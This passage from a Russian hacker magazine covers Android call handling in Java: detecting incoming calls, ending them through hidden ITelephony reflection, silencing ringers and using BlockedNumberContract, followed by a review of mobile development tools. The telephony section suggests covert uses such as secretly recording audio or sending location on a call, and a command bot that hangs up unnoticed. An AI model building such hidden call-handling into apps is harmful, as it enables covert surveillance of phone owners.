    AlarmManager manager = (AlarmManager) getSystemService(Context.
ALARM_SERVICE);
    // Запускаем в 10:00
    Calendar calendar = Calendar.getInstance();
    calendar.setTimeInMillis(System.currentTimeMillis());
    calendar.set(Calendar.HOUR_OF_DAY, 10);
    calendar.set(Calendar.MINUTE, 0);
    calendar.set(Calendar.SECOND, 0);
    manager.setInexactRepeating(AlarmManager.RTC_WAKEUP,
            calendar.getTimeInMillis(), AlarmManager.INTERVAL_DAY,
// Повторять каждые 24 часа
            pendingIntent);
}

Отменить запуск можно вот так:


public void cancelRepeat() {
    Intent intent = new Intent(this, ClickService.class);
    final PendingIntent pIntent = PendingIntent.getService(this, 0,
            intent, PendingIntent.FLAG_UPDATE_CURRENT);
    AlarmManager alarm = (AlarmManager) this.getSystemService(Context
.ALARM_SERVICE);
    alarm.cancel(pIntent);
}


ЗАКЛЮЧЕНИЕ
Класс AccessibilityService позволит изба виться от рутинных операций на тво‐
ем Android‐устройстве. Его возможностей достаточ но, чтобы реализовать
почти любую задачу, главное — дать разрешения и найти кликабельный эле‐
мент на экране.
КОДИНГ

ТЕЛЕФОНИЯ

                                                                              Сергей Мельников
                                                                                                    mail@s‐melnikov.netДЛЯ ХАКЕРА
РАБОТАЕМ СО
ЗВОНКАМИ В ANDROID
(ВПЛОТЬ ДО СЕДЬМОЙ
ВЕРСИИ)





В Android сущес твует программный интерфейс к низ коуров‐
невому аппа рат ному стеку телефона. С его помощью можно
написать программу для набора номера или обрабатывать
входящий звонок — например, негласно включить запись
с микрофона или инициировать отправку текущих координат.
Словом, интерес ных штук можно придумать мас су.


             INFO

                   В     юбилей ном      выпуске      «Хакера»
                        за номером 200 мы рассматривали скрытые и не
                       очень аспекты работы с СМС. Сегод ня мы про‐
                      должаем тему, обра тив вни мание на голосовые
                       звонки.


Одной из самых популярных программ времен Symbian и «Нокии» был так
называемый черный список звонков, поз воля ющий оградить тонкую натуру
владельца телефона от нежела тельных абонентов. И хотя сегодня подобная
функциональность интегрирова на в некоторые прошивки смартфо нов, зачас‐
тую такие возможности сводят ся лишь к банальному перманентному «бану»
контакта  в  адресной  книге. В  исследова тельских  целях  рассмотрим,
как подобный механизм реализуется на практике. Будем считать, что ты давно
читаешь рубрику «Кодинг», живешь в Android Studio и ругаешься исключитель‐
но на Java.





                      Типич ный черный список


А ГДЕ У НЕГО КНОПОЧКИ?
Каким бы ни было приложение, официальным или негласным (только для лич‐
ного пользования в целях исследования, естественно), одинако во плохо,
если оно будет падать из‐за отсутствия на устройстве телефонных функций
(Wi‐Fi‐план шет). Поэтому первое, что стоит сделать, — проверить таковые:


PackageManager pm = getPackageManager();
boolean isTelephonySupported = pm.hasSystemFeature(PackageManager.
FEATURE_TELEPHONY);
boolean isGSMSupported = pm.hasSystemFeature(PackageManager.FEATUR
E_TELEPHONY_GSM);

Как видишь, мы воспользовались методом hasSystemFeature из объекта
PackageManager, указав константу FEATURE_TELEPHONY в качестве параметра.
Кроме того, имеет смысл дополнительно проверить под держку GSM‐модуля
константой FEATURE_TELEPHONY_GSM.
   Если обе  константы лживы,  то мы ошиблись  устройством,  ничего
не поделаешь. В этом случае стоит завершить работу приложения, а на
выходе попросить пользователя сменить девайс ;).


ПРИНИМАЕМ ПЕРВЫЙ ЗВОНОК
С помощью класса PhoneStateListener в Android’е отслеживается сос‐
тояние телефона, но лишь в том случае, если приложение запросило пол‐
номочие READ_PHONE_STATE в своем манифесте:


<uses‐permission android:name="android.permission.READ_PHONE_STATE"/>

Далее необходимо переопределить и зарегистрировать метод onCallState‐
Changed в реализации PhoneStateListener, чтобы получать уведомления
об изменении состояния телефонного вызова. Готовая реализация представ‐
лена ниже:


PhoneStateListener stateListener = new PhoneStateListener() {
    public void onCallStateChanged(int state, String incomingNumber)
{
        switch (state) {
            case TelephonyManager.CALL_STATE_IDLE: break;
            case TelephonyManager.CALL_STATE_OFFHOOK: break;
            case TelephonyManager.CALL_STATE_RINGING:
                doMagicWork(incomingNumber); // Поступил звонок с
номера incomingNumber
                break;
        }
    }
};
...
TelephonyManager.listen(stateListener, PhoneStateListener.LISTEN
_CALL_STATE); // Помещаем в onCreate активности

Когда поступает звонок, целочисленный параметр state принимает значение
CALL_STATE_RINGING, что приводит к вызову нашей боевой (или мирной) наг‐
рузки в виде функции doMagicWork.





                         Входящий звонок

В природе данный вариант приема телефонного звонка используется чуть
реже, чем никогда. Дело в том, что в момент звонка приложение должно
работать на переднем плане, — такое своеобразное использование при‐
думать сложновато (разве только в отладочных целях), поэтому двигаемся
дальше.


ПРИНИМАЕМ ВТОРОЙ ЗВОНОК
Когда состояние телефона изменяет ся (например, в результате приема звон‐
ка), объект TelephonyManager начинает тран слировать намерение (Intent)
с действием ACTION_PHONE_STATE_CHANGED.





       На мере ния — межпрограм мный фреймворк для обме на сооб-
     щениями. Намере ния широко используются в Android для запус -
      ка/оста нов ки активнос тей и сер висов, трансляции сообщений
     по  всей  сис теме,  неяв ного  вызова  активнос тей,  сер висов
     и широковеща тельных приемников.
     Широковеща тельные приемники — ком поненты, с помощью
     которых приложе ние может отсле живать намере ния и реаги-
      ровать на любые полученные действия. Приемники реализуют
     событийную модель вза имодействия приложе ний и сис темы.
     Более под робно тема соз дания широковеща тельного приемника
     рас смотрена в статье «Ха кер ский Cron на Android».



Как и в предыдущем случае, приложение должно получить разрешение
READ_PHONE_STATE в манифесте:


<uses‐permission android:name="android.permission.READ_PHONE_STATE"/>

Там же регистрируется и широковещательный приемник, способный отсле‐
живать трансляцию намерения:


<receiver android:name="PhoneStateChangedReceiver" >
    <intent‐filter>
        <action android:name="android.intent.action.PHONE_STATE" />
    </intent‐filter>
</receiver>

При таком подходе мы всегда можем получать информацию о входящих звон‐
ках, даже если приложение в данный момент не запущено.
  Намерение, сообщающее об изменении состояния телефона, будет
содержать два парамет ра: EXTRA_STATE_RINGING — признак входящего
звонка и EXTRA_INCOMING_NUMBER — телефонный номер звоняще го.


public class PhoneStateChangedReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String phoneState = intent.getStringExtra (TelephonyManager.
EXTRA_STATE);
        if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING))
{
            String incomingNumber = intent.getStringExtra(Teleph
onyManager.EXTRA_INCOMING_NUMBER);
            doMagicWork(incomingNumber); // Поступил звонок с номера
incomingNumber
        }
    }
}

Такой подход и следует использовать на практике.


ПОЛОЖИ ТРУБКУ!
Итак, телефон весело звонит, номер входящего определен, наш широко‐
вещательный приемник сработал. Что дальше?
   Если рассматривать вариант черного списка или же бота, выполняющего
команды извне, то неплохо бы научиться вешать трубку, не привлекая вни‐
мания пользователя. Аппаратный стек телефона очень похож на нулевое
кольцо (ring 0) в Windows, в том смысле, что тоже представляет собой низ‐
коуровневый системный компонент. Поэтому не существу ет стандартно го
способа до него добраться (особенно если у тебя нерутованный аппарат).
   Как вариант, можно попытаться использовать язык описания интерфейсов
(Android Interface Deﬁnition Language, AIDL) для обеспечения межпроцессного
взаимодействия между компонентами системы.
  Для этого необходимо добавить в проект файл‐интерфейс ITelephony.
aidl следующего вида:


package com.android.internal.telephony;
interface ITelephony {
    boolean endCall();
    void answerRingingCall();
    void silenceRinger();
}

Следующий код подхватит интерфейс и, используя рефлексию, «положит»
трубку:


import java.lang.reflect.Method;
import com.android.internal.telephony.ITelephony;
...
TelephonyManager telephony = (TelephonyManager) context.getSys
temService(Context.TELEPHONY_SERVICE);
try {
    Class c = Class.forName(telephony.getClass().getName());
    Method m = c.getDeclaredMethod("getITelephony");
    m.setAccessible(true);
    telephonyService = (ITelephony) m.invoke(telephony);
    telephonyService.endCall();
} catch (Exception e) {
    e.printStackTrace();
}

Чтобы это хозяйство заработало, приложение дол жно получить еще одно
разрешение в манифесте:


<uses‐permission android:name="android.permission.MODIFY_PHONE_STATE"
/>

Из‐за этого применить подобный способ на устройствах с Android 2.3 и выше
не выйдет, так как начиная с Gingerbread данное разрешение считается сис‐
темным и попытка его использовать приведет к падению приложения:


Neither user 10031 nor current process has android.permission.MODIFY
_PHONE_STATE

Но ведь в Google Play полно приложений, реализующих черный список!
Как же они работают? Условно их можно разделить на две группы (кроме тех,
кто честно юзает AIDL): фальшивки и… костыли. Первые всего лишь имитиру‐
ют работу, периодически показывая в штор ке статистику «заблокиро ванных»
звонков (и СМС). Взамен они требуют доступ в интернет, скачивают килотон‐
ны рекламы, которую крутят по поводу и без. Расчет здесь строится на том,
что пользователь не сразу обнаружит обман и свою порцию баннеров гаран‐
тированно получит (гомеопатия в чистом виде). Такие программы вряд ли
соответствуют рубрике «Кодинг», поэтому мы их пропускаем.
  Приложения второй группы пыта ются оборвать звонок нетривиальными
способами — например, прикидываясь пользователем и нажимая кнопки:


public static void answerPhoneHeadsethook(Context context) {
    // «Нажимаем» и «отпускаем» кнопку на гарнитуре
    Intent buttonDown = new Intent(Intent.ACTION_MEDIA_BUTTON);
    buttonDown.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent
.ACTION_DOWN, KeyEvent.KEYCODE_HEADSETHOOK));
    context.sendOrderedBroadcast(buttonDown, "android.permission.
CALL_PRIVILEGED");
    Intent buttonUp = new Intent(Intent.ACTION_MEDIA_BUTTON);
    buttonUp.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent.
ACTION_UP, KeyEvent.KEYCODE_HEADSETHOOK));
    context.sendOrderedBroadcast(buttonUp, "android.permission.CALL_P
RIVILEGED");
}

Оригинальным, но вполне рабочим может быть метод уменьшения громкости
нежелательного звонка до нуля:


AudioManager audioManager = (AudioManager)context.getSystemService(
Context.AUDIO_SERVICE);
int ringerMode = audioManager.getRingerMode();
audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);

Используя объект AudioManager, мы сначала получаем текущий зву ковой
профиль getRingerMode(), а потом уста нав ливаем бесшумный режим Audi‐
oManager.RINGER_MODE_SILENT.
  После того как звонок прекратит ся (текущее состояние сменится на EX‐
TRA_STATE_IDLE), восстанавливаем исходный режим:


audioManager.setRingerMode(ringerMode);

Но даже в этом случае не обойтись без специальных разрешений:


<uses‐permission android:name="android.permission.MODIFY_AUDIO_SE
TTINGS" />
<uses‐permission android:name="android.permission.WRITE_SETTINGS"/>
<uses‐permission android:name="android.permission.WRITE_SECURE_SE
TTINGS"/>

Здесь мы не блокируем номер как таковой, скорее просто не поднимаем
трубку, однако такой подход не требует никаких «выкрутасов».
   Встречаются приложения, которые с переменным успехом пытаются
получить доступ к кнопкам на экране входящего звонка, как, например, здесь.


             INFO

                     К  рассматриваемо му  вопросу можно  отнести
                        задачу вывода информации поверх активности
                        входящего звонка (как вари ант — полная визуаль‐
                       ная замена окна для маскировки), но из сооб‐
                      ражений безопасности Android не позволяет соз‐
                        давать собственные активности для этих целей.
                     Тем не менее это не распространяется на сис‐
                     темные окна. Любопытная статья по теме.


Как показывает практика, многие «хаки», неплохо функционирующие на одних
устройствах, на других в лучшем случае не работают, а в худ шем — рушат
приложение во время входящего звонка. Соот ветственно, оценки подобных
приложений скачут от единицы («Ничего не работает, верните деньги!»)
до пяти («Пользуюсь уже двадцать лет, все устраивает!»).





                         Так работа ет или нет?

На этом можно было бы поставить жирную точку, если бы внезапно «кор‐
порация добра» не сделала ход слоном.


ЛИПКИЙ СПИСОК GOOGLE
В Android 7.0 Nougat (API 24) появился класс BlockedNumberContract — тот
самый черный список, но уже не в виде компонента про шивки смартфона, а в
качестве полноценного объекта ОС. Все звонки (а так же СМС и электронные
письма) от отправителей из этого списка будут автоматически откло нены
системой.
   BlockedNumberContract представляет собой стандартный контент‐про вай‐
дер, работать с которым могут, во‐первых, системные приложения, во‐вто‐
рых, приложения для СМС и телефонии, заданные как приложения по умол‐
чанию (Default App). Свойство «по умол чанию» должен установить сам поль‐
зователь — это одна из парадигм безопасности Android начиная с версии 4.4.
Для телефонии указан ное свойство наделяет код правом не только обра‐
батывать входящие и исходящие звонки, но и изменять базу дан ных (нап‐
ример, удалять отдельные звонки из логов). Поэтому, кстати, стоит очень нас‐
тороженно относиться к тем приложениям, даже из Google Play, которые
пытаются получить флаг «по умолчанию» и при этом имеют неограниченный
доступ в интернет, — вероятность слива информации весьма высока.


             INFO

                    Более подробную информа цию о приложениях
                        «по  умолчанию»  можно  почерпнуть  из  этой
                         статьи.


Работа с BlockedNumberContract напоминает вза имодействие с базой дан‐
ных: используются узнаваемые методы встав ки, удаления и, разумеется,
выборки записей.




     Контент‑провайдер — раз деляемое пос тоянное хра нилище (как
     пра вило, база данных SQLite), которое содер жит информа цию,
      относящу юся к приложе нию, и управляет ею. Пред почтительный
     способ обме на данными между раз личны ми программа ми.



Чтобы забанить номер телефона, вызываем стандар тный метод getContent‐
Resolver().insert:


ContentValues values = new ContentValues();
values.put(BlockedNumbers.COLUMN_ORIGINAL_NUMBER, "1234567890");
Uri uri = getContentResolver().insert(BlockedNumbers.CONTENT_URI,
values);

Несмотря на название, стол бик COLUMN_ORIGINAL_NUMBER может содержать
не только номер телефона, но и электронный адрес:


values.put(BlockedNumbers.COLUMN_ORIGINAL_NUMBER, "12345@abdcde.com")
;

Удалить номер из бана так же просто:


ContentValues values = new ContentValues();
values.put(BlockedNumbers.COLUMN_ORIGINAL_NUMBER, "1234567890");
Uri uri = getContentResolver().insert(BlockedNumbers.CONTENT_URI,
values);
getContentResolver().delete(uri, null, null);

Для проверки, не внесен ли номер в черный список, предусмотрен метод is‐
Blocked(Context, String).
  Наконец, чтобы получить всех отвергнутых одним махом:


Cursor c = getContentResolver().query(BlockedNumbers.CONTENT_URI,
    new String[]{BlockedNumbers.COLUMN_ID, BlockedNumbers.COLUMN
_ORIGINAL_NUMBER,
    BlockedNumbers.COLUMN_E164_NUMBER}, null, null, null);

Таким образом, рассмотренные в предыдущем разделе трюки постепенно
сойдут на нет. Другой вопрос, как быстро это случит ся. Доля Android 7 пока
не превышает даже инженерной погрешности.





               Фрагментация Android (март 2017 года)


ПЕРЕЗВАНИВАЕМ
Позвонить в Android’е можно двумя принципиально разными спо собами.
Первый, и самый прос той, — вызвать стан дартную активность, передав ей
в качестве параметра номер для набора:


Intent call = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:
8495‐123‐45‐56"));
startActivity(call);

Здесь используется инициирующее звонок намерение Intent.ACTION_DIAL,
а номер передается в виде пути URI с обязатель ным указанием протокола tel.
На экране смартфона пользователь увидит привычное окно с заведенным
номером.





                      Стандартная «звонилка»

Стандартная активность для дозвона разрешает изменить номер непосредс‐
твенно перед выпол нением звонка, поэтому никаких разрешений в манифес‐
те приложения не требует ся.
   Второй вариант — перехват намерений, которые обслуживаются стандар‐
тным приложением, и вызов своей активности. В этом слу чае отрисовка
экранных цифровых кнопок и поиск по кон тактам (и это далеко не полный
перечень) ложится на плечи программиста.
  Кроме того, поскольку в этом случае требует ся разрешение:


<uses‐permission android:name="android.permission.CALL_PHONE"/>

начиная с Android 4.4 приложение откажется работать, если оно не будет
выбрано по умол чанию, а пользователь вряд ли просто так сменит знакомую
«звонилку».





              Skype ненавязчиво пытается стать телефоном

Как видишь, Google неплохо защитила свой телефонный компонент, и вре‐
доносов, скрытно звонящих на короткие платные номера, в природе (пока
еще?) не наблюдается.


Ода манифес ту
Если ты внимательно чита ешь рубрику «Кодинг», то наверняка заметил, что то
или иное потенциаль но опасное действие в Android требует однозначного
разрешения. Несмотря на имеющиеся уязвимости (когда в последний раз
к тебе прилетали патчи?) в разных ком понентах системы, в целом основным
рассадником проблем оказывается сам пользователь. Разумеется, если ты
заинтересуешь ЦРУ, никакой запрет разрешений приложений тебя не спасет,
но в обычной жизни необходимо крайне настороженно относиться ко всему
устанавливаемому ПО, даже если оно родом из Google Play. Как думаешь,
стоит ли ставить себе калькулятор, если он требует доступа в интернет и воз‐
можности отправлять СМС?



ЗАКЛЮЧЕНИЕ
Сегодня мы познакомились с одним из главных компонентов современного
смартфона — телефонией (хотя, возможно, у интернет‐мессенджеров другое
мнение на этот счет). Как обычно, не все работа ет так, как хотелось бы, и свет
в велосипедной мастерской еще долго не погаснет, но такая уж у прог‐
раммистов судьба. В любом случае «Хакер» будет держать тебя в курсе.
КОДИНГ

    МОБИЛЬНАЯ РАЗРАБОТКА:
     ВЫБИРАЕМ
   ИНСТРУМЕНТЫ





                                INTEL XDK,
                            NATIVESCRIPT
                       И XAMARIN





                                                                Юрий Язев
                                                                                  Программист, разработчик
                                                                               компьютерных игр. Старый
                                                                                        автор журнала «Хакер»
                                                                                           yazevsoft@gmail.com





В предыдущей статье мы рассмотрели Silo‐подход к раз ‐
работке мобильных приложений, инструменты и способы их
использования, а также часть самых популярных black box
средств раз работки: среды Apache Cordova и Adobe Fuse.
На прошлом этапе лидером по охвату платформ стала Cor‐
dova, по удобству исполь зования — Fuse. В этой статье мы
продолжим изу чать «черный ящик» и рассмотрим еще нес‐
колько популярных средств разработки, а затем перейдем
к заключительной теме — кросс‐платформенному подходу
(cross‐platform).


Для начала напомню основную идею этого мини‐цикла статей (кстати, вот
первая). Мы заметили, что в связи со снижением порога вхождения в прог‐
раммирование и постоянным ростом сегмента мобильного ПО все больше
начинающих кодеров стремят ся испы тать себя в этом направлении. Чтобы
помочь им определиться с инструментарием, мы решили сделать разверну‐
тый мануал: рассмотреть все доступные средства разработки, на каждом
из описан ных средств реализовать мини‐пример и оценить, насколько удоб‐
но это делается, какого размера получается файл, а заодно измерить быс‐
тродействие и кратко обозреть сопутствующую инфраструктуру, которая
облегчит тебе работу, — официальные доки и неофициальные материалы.


У меня новая книж ка!
В издательстве «СО ЛОН‐Пресс» вышло второе, переработанное и допол‐
ненное издание моей книги о разработке двумерных игр для настольных
и мобильных платформ с помощью мультиплатформенного движка Torque 2D.
Материал книги значительно обновлен по сравнению с первым изданием,
даны ответы на самые частые вопросы, которые я получил от читателей
на свое мыло. Как всегда, подробную инфу о моих книгах ты можешь найти
на моем сайте, там же ты можешь скачать дополнительный контент и почитать
статьи про GameDev.



BLACK BOX
Intel XDK
Еще одна популярная тулза, относяща яся к категории black box, компании In‐
tel. Последняя достаточно активно пиарит свой продукт. По сути, он пред ‐
ставляет собой надстройку над Cordova, так как имен но она используется
для компиляции выпускаемых приложений. Распространяет ся бесплатно.
Как и прародитель, XDK (Cross‐Platform Development Tools) можно исполь‐
зовать на Windows, Linux, macOS.
  Я начну с Windows 10. Скачай инстал лятор. Установка в комментариях
не нуждается :). При первом запуске XDK предложит тебе войти в свой акка‐
унт на сервере Intel. После выполнения этой операции будет откры то главное
окно XDK. Сделаем наше минимальное приложение, которое мы создаем,
тестируя каждый инструмент. Напомню: оно состоит из формы, на которой
расположены надпись и кнопка.





                           Установка XDK

В левой части окна XDK находится список заготовок для проектов, разделен‐
ный на две части: верхняя Internet of things embedded application и нижняя
HTML5 companion  hybrid mobile or web app. Соответственно, в первой
находятся заготовки и примеры готовых проектов для интернета вещей, а во
второй — для веба и мобильных проектов.
   Как я уже говорил, XDK — надстройка над Cordova, но дополнительно
к этому был добавлен Node.js, в результате чего стало возможно разрабаты ‐
вать IoT‐приложения. В XDK имеется большое количество примеров и загото‐
вок последних. Среди семплов есть весьма любопыт ные экземпляры: пожар-
ная тре вога, детек тор землетрясения, управле ние рукой робота, сис -
тема осве щения рас тений (чем любопыт на эта система? Или уровень инте‐
реса зависит от того, какие растения выращивать? ;) — Прим. ред.), зву -
ковой детек тор, сис тема кон троля дос тупа, будильник, дверной звонок.
Среди темплейтов присутствуют аналоговое чтение/запись, цифровое чте‐
ние/запись, чтение /запись в COM‐порт, web‐сокеты, заготовки приложений
умного дома и так далее.
  Во втором свитке находятся заготовки и семплы для web и mobile. У раз‐
работчика есть выбор: либо стандартный HTML5, либо HTML5 с поддержкой
Cordova. Первый весь ма огра ничен в функциональ ности, предоставляя API
браузерного JavaScript, а второй расширен пла гинами Cordova, предназна‐
ченными для работы с компонентами мобильных устройств (компас, GPS,
акселерометр, разные дат чики).





                       Семплы XDK

Создадим проект для мобильных платформ. Среди темплейтов можно выб‐
рать или Blank (пустое приложение), или Layout and User Interface с заготов‐
ленными графическими компонентами. В числе семплов есть вполне юза‐
бельные примерчики:
 • сканер штрих‐кода;
 • геолокация;
 • аудиоплеер;
 • видеоплеер;
 • запись аудио/видео;
 • захват изображения.

На первоначаль ном экра не: HTML5 Companion Hybrid Mobile or Web App
→ Templates → Blank →HTML5 + Cordova. Для создания совместимого
проекта (для возможности использовать визу альный редак тор) надо пос‐
тавить галочку Use App Designer. Далее Continue. На следующем шаге XDK
предложит задать каталог для проекта. После чего запустит процедуру под‐
готовки проекта: ска чива ние и создание контента.
  После  успешного  создания  заготов ки  будет  пред ложено  выбрать
веб‐фреймворк. По умолчанию выбран Twitter Bootstrap v3. После выбора
откроется построитель макета. Для переключения между графическим редак ‐
тором и редактором кода надо воспользоваться кнопками Code и Design,
расположенными в левой верхней части интерфейса приложения. Окно раз‐
делено на шесть частей: в верхней располагаются вкладки (о них далее), сле‐
ва — список файлов проекта, чуть правее — панель компонентов, в середине
окна — область отображения макета, в правой части — список свойств выб‐
ранного эле мента, в нижней части выводит ся соответствующий создаваемо ‐
му элемен ту HTML‐код.





                           Разметка XDK

После создания приложения у тебя появляет ся доступ к пяти вклад кам,
на каждой из которых выполняется определен ное действие с проектом.
На вкладке Develop ведется собственно разработ ка про екта: код пишется
во встроенном HTML5‐редакторе Brackets (но программист может восполь‐
зоваться любым другим по своему предпочтению), интерфейс в совместимых
проектах (созданных в XDK с уста новленной галоч кой Use App Designer) мож‐
но модифицировать методом drag and drop, перетаскивая элемен ты поль‐
зовательского интерфейса. На вкладке Simulate можно по‐быстро му прос‐
мотреть, как выглядит разрабаты ваемое приложение на большом наборе
разных виртуальных девайсов. Вкладка Test служит для развертывания при‐
ложения на сер вере тестирования (для отладки без USB‐кабеля, по Wi‐Fi).
Вкладка Build позволяет построить и выпустить приложение для все го спек ‐
тра поддерживаемых устройств: iOS, Android, Windows Phone, Windows 10
UAP, BlackBerry и так далее. С помощью вкладки Publish можно подготовить
информацию и изображения для публикации приложения в разных сторах.
  Из группы Common перенеси на макет компонент Text. Отоб разится новая
вкладка с мини‐редактором для задания надписи и ее свойств. После вне‐
сения настроек не забудь переключиться на закладку body. Теперь из группы
BUTTONS помести компонент Button. В списке свойств можно изменить
отступы. Однако, чтобы изменить надпись на кнопке на Click: 0, я не нашел
ничего лучше, чем переключиться в HTML‐разметку и поправить ее напрямую.
Далее нужно создать событие «нажатие кнопки». Открой HTML‐код, прок рути
файл вниз до тега button, задай для кнопки идентификатор: id="but". Ниже
после закрытия тега body: добавь функцию


<script>
    var i = 0
    document.getElementById('but').onclick = function(){
        document.getElementById('but').textContent="Click: " + ++i
    }
</script>

На этом кодирование завершено. Для тестирования приложения перек‐
лючись на закладку Simulate: из первого ниспадающего списка выбери
желаемую операционку, из второго — устройство, для запуска симулятора
жми кнопку с треугольником. В результате запустится XDK Simulator, где мож‐
но проверить щел чок на кнопке.





                        XDK Simulator

Для построения проекта перейди на закладку Build. Сначала создадим билд
для Android. Чтобы не отвлекаться, оста вим все изоб ражения по умолчанию.
При первом запуске имеются траблы, из‐за чего проект нельзя сразу постро ‐
ить. В области Cordova Hybrid Mobile App Platform щелкни по прямоугольнику
со значком дроида. Для Android‐проекта надо задать сертификат разработ‐
чика. Щелкни плюс рядом с надписью Add Android certiﬁcate to your account.
Появится окно создания сертификата. Заполни его коррек тными дан ными.
Жми Save. Запустится процесс создания сер тификата. После чего в ниспада‐
ющем списке Developer Certiﬁcate можно будет выбрать созданный сер‐
тификат. Возвращаемся на вкладку Build, билд для Android помечен зеленой
галочкой. Чтобы настроить построение UAP, надо ввести Windows Publisher
Key и Publisher Display Name. После этого можно переходить к постро ению
пока двух проектов, iOS‐приложение придется строить на маке.


Наше зак лючение
Билд для Android в моем случае получил ся 220 Кбайт (меньше, чем под Cor‐
dova). XDK гораздо удобнее Cordova благода ря наличию интегрированных
инструментов: редактора кода, построителя форм, встроенного симулятора,
инструментов для построения и разверты вания. Большое количество качес‐
твенной докумен тации и обучающих материалов на сайте Intel позволяет дос‐
таточно быстро освоиться с инструментами разработки.


NativeScript
Фреймворк с открытым исходным кодом NativeScript появился в 2014 году.
Подобно Cordova, он служит для мультиплатформенной разработки приложе‐
ний, но пока только под две плат формы: iOS и Android. Как и Cordova, поз‐
воляет воспользоваться навыками web‐кодинга, применяя платформо неза‐
висимые языки JavaScript, TypeScript для программирования бизнес‐логики
и Angular для построения пользовательского интерфейса.


NativeScript для macOS
Сначала ставим Node.js (проверить можно командой node –version), затем
NativeScript CLI от лица администратора: sudo  npm  install  ‐g  nat‐
ivescript. Далее последует ска чивание и установка пакетов. На появ‐
ляющиеся два вопроса ответь отрицательно. После завершения установки
проверь NS CLI, введя tns. Появит ся вопрос об отправлении статистики,
ответь по желанию. Для создания iOS‐проекта используй те же команды, что
во время создания Android‐проекта. Однако запускай первый командой tns
run ios.



В  отличие  от Cordova  NativeScript использует на 100%  нативные  API
для работы с аппаратным обеспечением девайса, которые поставляются
непосредственно в составе инструментария, кроме того, их можно пополнить
из ресурсов Cocoapods, Android Arsenal и с помощью менеджера проектов
npm. При разработке с помощью Cordova на выходе получается приложе ние,
работающее в среде веб‐браузера; с другой стороны, NativeScript создает
полностью нативные приложения, с родными для конкрет ной платформы эле‐
ментами UI.
  Перейдем к практике. Чтобы установить NS в Windows, можно восполь‐
зоваться инсталлятором. Его можно ска чать с этой страницы.





                           Установка NS

Он попытается обнаружить необходимое ПО. Для работы NS нужны: JDK 1.8,
Node.js 6, Android SDK. Все эти прибамбасы должны иметь указывающие
на них переменные окружения. Если что‐то не уста новлено или не указано,
инсталлятор NS на это пожалуется. Когда все зависимости будут настро ены,
станет активна кнопка Install и можно будет начать установку. Заметь, инстал‐
лятор надо запускать от администратора. Если он постоянно вылетает, при‐
мени менеджер пакетов Chocolatey, как написано на странице. Им удоб но
воспользоваться, если на компе не установлены никакие вспомогательные
тулзы, перечисленные выше, в ином случае быстрее настроить вручную,
нежели ставить второй раз.
  Работа с NativeScript, как и с Cordova, происходит в командной строке,
поэтому открой консоль и для проверки введи tns. Если NS коррек тно уста‐
новлена, будет выведена справ ка по всем коман дам.
   Теперь займемся проектом (не забудь переместиться в целевую папку
NS‐проектов). Чтобы создать проект на основе заготовки, введи


tns create HelloWorld ‐‐template nativescript‐template‐tutorial

Будут докачаны необходимые файлы, и появит ся новый проект. Зайди внутрь
каталога: cd HelloWorld и выполни команду tns run Android (нативный
симулятор использует HAXM, поэтому не забудь выключить Hyper‐V). В итоге,
если Android SDK установлен верно и соз дан хотя бы один симулятор, он
запустится на выпол нение и в него будет загружено подопыт ное приложение.


Adobe Flash Builder
Этот инструмент тоже можно отнести к black box, но их уже и так оказалось
слишком много, поэтому я решил не говорить про него. Лишь отмечу, что соз‐
данные в нем приложения исполняются в среде Air, также имеют доступ к ком‐
понентам мобильного девайса. Flash выходит из моды не только в браузере,
но и в мобайле. Лет семь назад Flash широко использовался для разработки
мобильных игр, но его время прошло. Теперь это уходящий поезд,  и,
по‐моему, торопиться на него уже нет смысла.



Наше зак лючение
Подведем итоги. Размер построенного приложения для Android получил‐
ся 11,6 Мбайт, для iOS — 33,8 Мбайт; великовато в обоих случаях. Ско рость
выполнения протестировать не удалось, охват средств поддерживаемых
платформ по определению неполный. Как и Cordova, использовать Native‐
Script из командной строки утомительно. Я предпочитаю IDE командной стро‐
ке, лично мне так удобнее программировать. Документация на официальном
сайте довольно подробная, а видео на YouTube вызывает улыбку и, по‐моему,
не годится в качестве обучающего материала. Если NS будет настолько крут,
как о нем говорят, и удоб нее, чем сейчас, то тулза станет инте реснее. Пока —
нет, минус.


Использование интегрированных средств разработ ки удобно тем, что «все
включено» в один инструмент и программисту не надо переходить из одной
программы/редактора в другую, чтобы вести разработку.



CROSS-PLATFORM
Xamarin
Через некоторое время после выхода в свет Visual Studio 2015 Microsoft
приобрела Xamarin. В последующие сервис‐паки студии MS стала внедрять
его поддержку, но получалось это кривовато: то проекты создавались
с ошибками, то не создавались совсем, то возникали проблемы с разметкой
или при компиляции — короче, косяков было предостаточно. Например, в 4‐
м сервис‐паке была проблема  с  созданием  Android‐проекта,  которая
решалась заменой и добавлением компонентов.
  Я пишу эти строки буквально через неделю после выхода Visual Studio
2017 , поэтому все ска занное про мобильные мультиплатформенные при‐
ложения будет актуально для этой версии.
  В основе Xamarin лежит открытая среда Mono, реализованная на подав‐
ляющем большинстве всевозможных программно‐аппаратных платформ.
Разработка ведется с использованием управляемых язы ков C#/F#. Даль‐
нейшие действия зависят от плат формы. В случае iOS происходит ком‐
пиляция в машинные инструкции, тогда как в случае с Android — тран сляция
в промежуточный байт‐код и запаковка урезанного экземпляра Mono в при‐
ложение. При последующем запуске этого приложения на Android‐устройстве
экземпляр Mono преобразует байт‐код в инструкции, понятные виртуальной
машине ART (ранее Dalvik), лежащей в основе ОС Android.


iOS-при ложе ния на C# из‑под Windows
В рам ках Visual Studio 2017 (вместе с Xamarin) можно разрабатывать iOS‐при‐
ложения на C# из‐под Windows, можно писать логику и моделировать макет,
однако, когда дело доходит до тестирования и отладки, в любом случае при‐
дется воспользоваться маком. Чтобы, не отходя от Windows PC, прямо из VS
запускать и отлаживать через Wi‐Fi приложения на маке, понадобится под‐
готовка. Вызови поиск Spotlight (cmd + space или ctrl + space, в зависимости
от установленной раскладки клавиатуры, у меня Win‐раскладка, поэтому вто ‐
рой вариант), в поле поиска введи «Общий доступ», ниже в результатах поис‐
ка выбери соот ветствующий пункт. В появившемся окне в списке сле ва
отметь галочкой «Удаленный вход». Пра вее в разделе «Разрешить доступ»
отметь пункт «Всем пользователям».





                     Общий доступ

Затем в Visual Studio открой «Сервис → Параметры». В появившемся окне
